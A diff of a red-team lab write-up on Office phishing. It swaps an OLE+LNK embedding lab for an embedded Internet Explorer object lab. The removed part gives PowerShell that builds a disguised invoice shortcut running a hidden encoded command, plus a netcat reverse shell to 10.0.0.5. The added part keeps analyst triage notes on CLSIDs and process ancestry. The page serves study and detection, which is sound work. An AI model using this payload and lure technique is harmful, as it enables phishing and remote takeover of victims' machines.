@@ -1,106 +1,43 @@
 ---
-description: 'Phishing, Initial Access using embedded OLE + LNK objects'
+description: Code execution with embedded Internet Explorer Object
 ---
 
 # Phishing: OLE + LNK
 
-This lab explores a popular phishing technique where attackers embed .lnk files into the Office documents and camouflage them with Ms Word office icons in order to deceive victims to click and run them. 
+## Phishing: Embedded Internet Explorer
 
-## Weaponization
+In this phishing lab I am just playing around with the POCs researched, coded and described by Yorick Koster in his blog post [Click me if you can, Office social engineering with embedded objects](https://securify.nl/blog/SFY20180801/click-me-if-you-can_-office-social-engineering-with-embedded-objects.html)
 
-Creating an .LNK file that will trigger the payload once executed:
+### Execution
 
-{% code title="attacker@local" %}
-```csharp
-$command = 'Start-Process c:\shell.cmd'
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-$encodedCommand = [Convert]::ToBase64String($bytes)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLJxiytqzVTtACKX5C5%2F-LLJyjh9CIrwT0n3Rvp5%2Fphishing-iex-video.gif?alt=media\&token=de339ff1-d27e-4397-99da-88a3d1e69ee3)
 
-$obj = New-object -comobject wscript.shell
-$link = $obj.createshortcut("c:\experiments\ole+lnk\Invoice-FinTech-0900541.lnk")
-$link.windowstyle = "7"
-$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
-$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA=="
-$link.save()
-```
-{% endcode %}
+{% file src="../../../.gitbook/assets/poc.ps1" %}
 
-Powershell payload will trigger a rudimentary NC reverse shell:
+{% file src="../../../.gitbook/assets/WebBrowser.docx" %}
 
-{% code title="c:\\shell.cmd" %}
-```csharp
-C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
-```
-{% endcode %}
+### Observations
 
-Once the above powershell script is executed, an `.LNK` shortcut is created:
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLJxiytqzVTtACKX5C5%2F-LLJysTYVw-QHrgMvF2T%2Fphishing-iex-ancestry.png?alt=media\&token=f812e343-1e7e-48bb-9869-ff42a809b86c)
 
-![](../../../.gitbook/assets/ole-lnk-shortcut-created.png)
+As with other phishing documents, we can unzip the .docx and do a simple hexdump/strings on the `oleObject1.bin` to look for any suspicious strings referring to some sort of file/code execution:
 
-Let's create a Word document that will contain the malicious shortcut that was created in the previous step:
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLK05DndfnIsuUfV705%2F-LLK0UeV_qWarNBkci5z%2Fphishing-iex-olebin.png?alt=media\&token=8b70b55d-0cbc-4ad6-a18a-59df52dadaab)
 
-![](../../../.gitbook/assets/ole-good-document.png)
-
-Let's insert a new object into the document by selecting a `Package`and changing its icon source to a Microsoft Word executable:
-
-![](../../../.gitbook/assets/ole-insert-ole-object-with-icon.png)
-
-![](../../../.gitbook/assets/ole-change-icon.png)
-
-Point the package to the .lnk file containing the payload:
-
-![](../../../.gitbook/assets/ole-payload.png)
-
-Final result:
-
-![](../../../.gitbook/assets/ole-weaponized.png)
-
-## Execution
-
-Victim executing the embedded document. Gets presented with a popup to confirm execution:
-
-![](../../../.gitbook/assets/ole-execution.png)
-
-Once the victim confirms they want to open the file - the reverse shell comes back to the attacker:
-
-![](../../../.gitbook/assets/ole-execution2.png)
-
-{% file src="../../../.gitbook/assets/ole.ps1" caption="OLE+LNK Powershell Script" %}
-
-{% file src="../../../.gitbook/assets/invoice-fintech-0900541.lnk" caption="Invoice-FinTech-0900541.lnk" %}
-
-{% file src="../../../.gitbook/assets/completely-not-a-scam-ole+lnk.docx" caption="Phishing: OLE+Lnk MS Word Doc Package" %}
-
-## Observations
-
-After the payload is triggered, the process ancestry looks as expected - powershell gets spawned by winword, cmd is spawned by powershell..:
-
-![](../../../.gitbook/assets/ole-ancestry1.png)
-
-Soon after, the powershell gets killed and cmd.exe becomes an orphaned process:
-
-![](../../../.gitbook/assets/ole-ancestry2.png)
-
-Like in [T1137: Phishing - Office Macros](t1137-office-vba-macros.md), you can use rudimentary tools on your Windows workstation to quickly triage the suspicious Office document. First off, rename the file to a .zip extension and unzip it. Then you can navigate to `word\embeddings` and find `oleObject.bin` file that contains the malicious `.lnk`:
-
-![](../../../.gitbook/assets/ole-embedded-bin.png)
-
-Then you can do a simple `strings` or hexdump against the file and you should immediately see signs of something that should raise your eyebrow\(s\):
+The CLSID object that makes this technique work is a `Shell.Explorer.1` object, as seen here:
 
 ```csharp
-hexdump.exe -C .\oleObject1.bin
+Get-ChildItem 'registry::HKEY_CLASSES_ROOT\CLSID\{EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B}'
 ```
 
-![](../../../.gitbook/assets/ole-hexdump.png)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLK2sE5XTQMWzZS7exM%2F-LLK2l7mDsspEUow5HBF%2Fphishing-explorer-obj.png?alt=media\&token=95036445-3044-4b29-81d5-b7839229d143)
 
-As an analyst, one should look for `CLSID 00021401-0000-0000-c000-000000000046` in the .bin file, which signifies that the .doc contains an embnedded .lnk file. In our case this can be observed here:
+As an analyst, one should inspect the .bin file and look for the {EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B} bytes inside, signifying the `Shell.Explorer.1` object being embedded in the .bin file:
 
-![](../../../.gitbook/assets/lnk-clsid.png)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLLGrSLoowguTx6g3S0%2F-LLLHD4o6Fm9OQa8C0Hw%2Fphishing-clsid.png?alt=media\&token=b3603c36-4957-4053-9ba1-29365fa5248b)
 
-## References
+### References
 
-{% embed url="https://msdn.microsoft.com/en-gb/library/dd891343.aspx" %}
+{% embed url="https://securify.nl/blog/SFY20180801/click-me-if-you-can_-office-social-engineering-with-embedded-objects.html" %}
 
-{% embed url="https://adsecurity.org/wp-content/uploads/2016/09/DerbyCon6-2016-AttackingEvilCorp-Anatomy-of-a-Corporate-Hack-Presented.pdf" %}
-
+<br>
